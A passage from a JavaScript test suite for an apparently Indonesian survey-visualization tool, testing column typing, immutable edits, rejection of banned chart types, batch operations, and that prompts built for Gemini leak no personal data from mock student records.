        columnIndex: cols.length,
        rawName: name,
        cleanName: name,
        displayTitle: name,
        type: 'LIKERT_SCALE',
        isPII: false,
        isExcluded: false,
        recommendedChart: 'ordered_likert',
        selectedChart: 'ordered_likert',
        totalResponses: 250,
        validResponses: 250,
        missingResponses: 0,
        uniqueValuesCount: maxScale,
        distribution: dist,
        likertScale: likertStats,
        offlineSummary: `Tingkat persetujuan responden mencapai ${likertStats.netPositivePercent}%.`,
      });
    }

    for (let i = 1; i <= 10; i++) {
      const name = `Multi-Select ${i}: Sumber Informasi Kegiatan Kampus`;
      const tokens = [
        { token: 'Instagram Official', count: 210, percentage: 84.0 },
        { token: 'Grup WhatsApp', count: 185, percentage: 74.0 },
        { token: 'Website Resmi', count: 120, percentage: 48.0 },
      ];
      cols.push({
        id: `col_multi_${i}`,
        columnIndex: cols.length,
        rawName: name,
        cleanName: name,
        displayTitle: name,
        type: 'MULTI_SELECT_CHECKBOX',
        isPII: false,
        isExcluded: false,
        recommendedChart: 'ranked_bar',
        selectedChart: 'ranked_bar',
        totalResponses: 250,
        validResponses: 250,
        missingResponses: 0,
        uniqueValuesCount: 3,
        distribution: { 'Instagram Official': 210, 'Grup WhatsApp': 185, 'Website Resmi': 120 },
        multiSelect: { totalSelections: 515, averageSelectionsPerRespondent: 2.06, tokenFrequencies: tokens },
        offlineSummary: 'Pilihan paling dominan adalah Instagram Official.',
      });
    }

    for (let i = 1; i <= 5; i++) {
      const name = `Teks Bebas ${i}: Masukan dan Rekomendasi Terbuka`;
      cols.push({
        id: `col_text_${i}`,
        columnIndex: cols.length,
        rawName: name,
        cleanName: name,
        displayTitle: name,
        type: 'OPEN_ENDED_TEXT',
        isPII: false,
        isExcluded: false,
        recommendedChart: 'text_feed',
        selectedChart: 'text_feed',
        totalResponses: 250,
        validResponses: 180,
        missingResponses: 70,
        uniqueValuesCount: 180,
        distribution: {},
        offlineSummary: 'Terdapat 180 jawaban kualitatif terbuka.',
      });
    }

    return cols;
  }

  const dataset60 = generateSynthetic60Columns();

  runTest('3.1: 60-column synthetic survey dataset structure and typing verification', () => {
    assert.strictEqual(dataset60.length, 60, 'Dataset must have exactly 60 columns (50+)');
    assert.strictEqual(dataset60.filter(c => c.isPII).length, 5);
    assert.strictEqual(dataset60.filter(c => c.type === 'DICHOTOMOUS_BINARY').length, 10);
    assert.strictEqual(dataset60.filter(c => c.type === 'NOMINAL_DEMOGRAPHIC').length, 15);
    assert.strictEqual(dataset60.filter(c => c.type === 'LIKERT_SCALE').length, 15);
    assert.strictEqual(dataset60.filter(c => c.type === 'MULTI_SELECT_CHECKBOX').length, 10);
    assert.strictEqual(dataset60.filter(c => c.type === 'OPEN_ENDED_TEXT').length, 5);
  });

  runTest('3.2: Rapid consecutive updates on 60 columns assert immutability and state consistency', () => {
    let currentColumns = [...dataset60];

    for (let step = 0; step < 100; step++) {
      const targetIdx = step % currentColumns.length;
      const originalCol = currentColumns[targetIdx];

      // 1. updateColumnTitle
      const newTitle = `Revisi Judul Step ${step}`;
      const beforeTitle = originalCol.displayTitle;
      const renamed = updateColumnTitle(originalCol, newTitle);
      assert.notStrictEqual(renamed, originalCol, 'updateColumnTitle must return a new object (immutable)');
      assert.strictEqual(renamed.displayTitle, newTitle);
      assert.strictEqual(originalCol.displayTitle, beforeTitle, 'Original column must not be mutated in-place');

      // 2. toggleColumnExclusion
      const toggled = toggleColumnExclusion(renamed, step % 2 === 0);
      assert.notStrictEqual(toggled, renamed);
      assert.strictEqual(toggled.isExcluded, step % 2 === 0);

      // 3. overrideChartType
      const allowed = ['horizontal_bar', 'vertical_bar', 'donut'];
      const nextChart = allowed[step % allowed.length];
      const chartUpdated = overrideChartType(toggled, nextChart);
      assert.notStrictEqual(chartUpdated, toggled);
      assert.strictEqual(chartUpdated.selectedChart, nextChart);

      currentColumns[targetIdx] = chartUpdated;

      // 4. reorderColumns
      const toIdx = (step * 13) % currentColumns.length;
      const reordered = reorderColumns(currentColumns, targetIdx, toIdx);
      assert.strictEqual(reordered.length, 60);
      currentColumns = reordered;
    }

    assert.strictEqual(currentColumns.length, 60);
    currentColumns.forEach((c, idx) => {
      assert.strictEqual(c.columnIndex, idx, `Column at index ${idx} must have columnIndex === ${idx}`);
    });
  });

  runTest('3.3: Prohibited chart injection under rapid fuzzing across all 60 columns', () => {
    const banned = ['radar', 'spider', '3d_pie', '3d_pie_wedge', 'dual_y_axis', 'bubble', '3d_surface'];
    dataset60.forEach((col, idx) => {
      const randomBanned = banned[idx % banned.length];
      assert.throws(() => {
        overrideChartType(col, randomBanned);
      }, /strictly prohibited/i, `Column ${col.cleanName} must reject ${randomBanned}`);
    });
  });

  // ==========================================================================
  // SECTION 4: Realistic PII Leakage Audit
  // ==========================================================================
  console.log('\n--- SECTION 4: Realistic PII Leakage Audit ---');

  const mockRealPii = {
    names: ['Muhammad Rizky Pratama', 'Siti Nurhaliza Putri', 'Budi Santoso Wibowo', 'Dewi Lestari Kusuma'],
    nims: ['21060120140123', '24060121130045', '11000122120011', '21080120130089'],
    emails: ['m.rizky@students.undip.ac.id', 'siti.nurhaliza@gmail.com', 'budi.santoso@undip.ac.id'],
    phones: ['081234567890', '+6281987654321', '0857-1234-5678'],
    timestamps: ['2024-03-12 10:14:22', '12/03/2024 10:14:22', '2024-09-14T08:00:00Z'],
  };

  runTest('4.1: buildGeminiPrompt with mock columns containing real PII asserts ZERO record leaks', () => {
    const richCol = {
      ...dataset60[6],
      rawRows: mockRealPii.names.map((name, i) => ({
        Nama: name,
        NIM: mockRealPii.nims[i % mockRealPii.nims.length],
        Email: mockRealPii.emails[i % mockRealPii.emails.length],
        Phone: mockRealPii.phones[i % mockRealPii.phones.length],
        Timestamp: mockRealPii.timestamps[i % mockRealPii.timestamps.length],
        Jawaban: 'Puas',
      })),
    };

    const payload = buildGeminiPrompt(richCol);
    assert.ok(!payload.includes('rawRows'), 'Payload must never include rawRows');
    assert.ok(!payload.includes('Jawaban'), 'Payload must not serialize individual record rows');

    mockRealPii.names.forEach(name => assert.ok(!payload.includes(name), `Payload leaked name: ${name}`));
    mockRealPii.nims.forEach(nim => assert.ok(!payload.includes(nim), `Payload leaked NIM: ${nim}`));
    mockRealPii.emails.forEach(email => assert.ok(!payload.includes(email), `Payload leaked email: ${email}`));
    mockRealPii.phones.forEach(phone => assert.ok(!payload.includes(phone), `Payload leaked phone: ${phone}`));
    mockRealPii.timestamps.forEach(ts => assert.ok(!payload.includes(ts), `Payload leaked timestamp: ${ts}`));
  });

  runTest('4.2: buildGeminiPrompt on PII column itself does not leak student values', () => {
    const piiCol = dataset60[1]; // Nama Lengkap
    const payload = buildGeminiPrompt(piiCol);
    const parsed = JSON.parse(payload);
    assert.strictEqual(parsed.type, 'METADATA_PII');
    assert.deepStrictEqual(parsed.distribution, {});
    mockRealPii.names.forEach(name => assert.ok(!payload.includes(name)));
  });

  runTest('4.3: Real dataset Sample 1 UPGRADING BEM UNDIP zero PII audit across all 25 survey question columns', () => {
    const ds1 = loadDemoSurvey1();
    const rawNames = ds1.rawRows.map((r) => r['Nama Lengkap '] || r['Nama Lengkap'] || r['Nama']).filter(Boolean);
    assert.ok(rawNames.length > 50, `Expected >50 raw names, got ${rawNames.length}`);

    const surveyCols = ds1.columns.filter((c) => !c.isPII);
    assert.strictEqual(surveyCols.length, 25);

    surveyCols.forEach((col) => {
      const prompt = buildGeminiPrompt(col);
      rawNames.slice(0, 30).forEach((studentName) => {
        if (studentName.length > 4) {
          assert.ok(!prompt.includes(studentName), `Survey column '${col.cleanName}' leaked student name: ${studentName}`);
        }
      });
      assert.ok(!prompt.includes('10/03/2024'));
      assert.ok(!prompt.includes('GMT+7'));
    });
  });

  runTest('4.3b: PII column exclusion invariant — PII columns in Sample 1 are strictly excluded by default', () => {
    const ds1 = loadDemoSurvey1();
    const piiCols = ds1.columns.filter((c) => c.isPII);
    assert.strictEqual(piiCols.length, 2); // Timestamp & Nama Lengkap
    piiCols.forEach((col) => {
      assert.strictEqual(col.isExcluded, true, `PII column ${col.cleanName} must be excluded`);
      assert.strictEqual(col.selectedChart, 'none', `PII column ${col.cleanName} selectedChart must be none`);
      assert.strictEqual(col.recommendedChart, 'none', `PII column ${col.cleanName} recommendedChart must be none`);
    });
  });

  runTest('4.4: Real dataset Sample 2 Campus Safety zero PII audit across all 15 columns', () => {
    const ds2 = loadDemoSurvey2();
    ds2.columns.forEach(col => {
      const prompt = buildGeminiPrompt(col);
      assert.ok(!prompt.includes('12/03/2024'));
      assert.ok(!prompt.includes('2024/03/12'));
    });
  });

  // ==========================================================================
  // SECTION 5: Batch Operations Consistency on Complex Mixed Datasets
  // ==========================================================================
  console.log('\n--- SECTION 5: Batch Operations Consistency on Complex Mixed Datasets ---');

  const batchIncludeAll = (columns) => columns.map(c => ({
    ...c,
    isExcluded: c.isPII || c.selectedChart === 'none',
  }));

  const batchExcludeOpenEnded = (columns) => columns.map(c => {
    if (c.type === 'OPEN_ENDED_TEXT') return { ...c, isExcluded: true };
    return c;
  });

  const batchResetToRecommended = (columns) => columns.map(c => ({
    ...c,
    selectedChart: c.recommendedChart,
    displayTitle: c.cleanName,
    isExcluded: c.isPII,
  }));

  runTest('5.1: Batch "Aktifkan Semua" on 60 mixed columns activates visual columns and preserves PII exclusion', () => {
    const allExcluded = dataset60.map(c => ({ ...c, isExcluded: true }));
    const result = batchIncludeAll(allExcluded);

    assert.notStrictEqual(result, allExcluded, 'Must return new array (immutable)');

    const activeVisuals = result.filter(c => !c.isPII && c.selectedChart !== 'none');
    assert.strictEqual(activeVisuals.length, 55);
    activeVisuals.forEach(c => assert.strictEqual(c.isExcluded, false));

    const piiCols = result.filter(c => c.isPII);
    assert.strictEqual(piiCols.length, 5);
    piiCols.forEach(c => assert.strictEqual(c.isExcluded, true, `PII column '${c.cleanName}' MUST remain excluded`));
  });

  runTest('5.2: Batch "Aktifkan Semua" preserves exclusion for columns with selectedChart === none', () => {
    const modified = dataset60.map((c, i) => i === 10 ? { ...c, selectedChart: 'none' } : c);
    const result = batchIncludeAll(modified);
    assert.strictEqual(result[10].isExcluded, true);
  });

  runTest('5.3: Batch "Kecualikan Teks" excludes 100% of OPEN_ENDED_TEXT columns without affecting others', () => {
    const allIncluded = dataset60.map(c => ({ ...c, isExcluded: false }));
    const result = batchExcludeOpenEnded(allIncluded);

    const textCols = result.filter(c => c.type === 'OPEN_ENDED_TEXT');
    assert.strictEqual(textCols.length, 5);
    textCols.forEach(c => assert.strictEqual(c.isExcluded, true));

    result.forEach((c, idx) => {
      if (c.type !== 'OPEN_ENDED_TEXT') {
        assert.strictEqual(c.isExcluded, allIncluded[idx].isExcluded);
      }
    });
  });

  runTest('5.4: Batch "Reset Rekomendasi" resets selectedChart, displayTitle, and isExcluded for all 60 columns', () => {
    const heavilyModified = dataset60.map(c => ({
      ...c,
      selectedChart: 'vertical_bar',
      displayTitle: 'MODIFIED TITLE',
      isExcluded: false,
    }));

    const reset = batchResetToRecommended(heavilyModified);
    reset.forEach(c => {
      assert.strictEqual(c.selectedChart, c.recommendedChart);
      assert.strictEqual(c.displayTitle, c.cleanName);
      assert.strictEqual(c.isExcluded, c.isPII);
    });
  });

  runTest('5.5: Sequential composite batch operations preserve invariants and immutability', () => {
    let state = [...dataset60];

    // 1. Modify
    state = state.map((c, i) => ({
      ...c,
      displayTitle: `Edited Title ${i}`,
      isExcluded: i % 2 === 0,
      selectedChart: c.isPII ? 'none' : 'horizontal_bar',
    }));

    // 2. Kecualikan Teks
    state = batchExcludeOpenEnded(state);
    state.filter(c => c.type === 'OPEN_ENDED_TEXT').forEach(c => assert.strictEqual(c.isExcluded, true));

    // 3. Aktifkan Semua
    state = batchIncludeAll(state);
    state.filter(c => c.isPII).forEach(c => assert.strictEqual(c.isExcluded, true));
    state.filter(c => !c.isPII && c.selectedChart !== 'none').forEach(c => assert.strictEqual(c.isExcluded, false));

    // 4. Reset Rekomendasi
    state = batchResetToRecommended(state);
    state.forEach(c => {
      assert.strictEqual(c.selectedChart, c.recommendedChart);
      assert.strictEqual(c.displayTitle, c.cleanName);
      assert.strictEqual(c.isExcluded, c.isPII);
    });
  });

  // ==========================================================================
  // FINAL RESULTS SUMMARY
  // ==========================================================================
  console.log('\n========================================================================');
  console.log(`  CHALLENGER M2-2 TEST SUMMARY: ${passedTests} / ${totalTests} TESTS PASSED`);
  if (failures.length > 0) {
    console.log(`  CRITICAL FAILURES DETECTED: ${failures.length}`);
    for (const f of failures) {
      console.log(`    - ${f.testName}: ${f.error}`);
    }
    console.log('  VERDICT: REJECT');
    console.log('========================================================================\n');
    process.exit(1);
  } else {
    console.log('  ZERO FAILURES DETECTED. ALL MUTATIONS & FAILURE MODES RESILIENT.');
    console.log('  VERDICT: APPROVE');
    console.log('========================================================================\n');
    process.exit(0);
  }
})();
